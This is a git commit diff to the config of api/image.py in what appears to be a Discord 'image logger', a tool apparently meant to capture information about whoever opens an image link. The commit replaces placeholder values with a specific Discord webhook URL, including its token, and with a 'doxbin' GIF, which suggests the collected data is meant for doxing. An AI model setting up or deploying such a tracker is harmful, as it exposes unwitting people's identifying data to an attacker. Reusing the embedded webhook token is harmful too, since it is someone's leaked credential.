35fd3a413dc5dae90a910ed0539f8cc881cf5e89
IlJOJOOG123 <jonathan.garrasi@gmail.com>
2025-07-17 19:54:26 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,8 +13,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1395434164584710264/BNksUbpH17GtgaasdNxjYbICmHeCEdnKCOOA6vyiE7XCxSjrMKY9cseAh6M89H23CqW-",
+    "image": "https://tenor.com/view/doxbin-gif-26502134", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
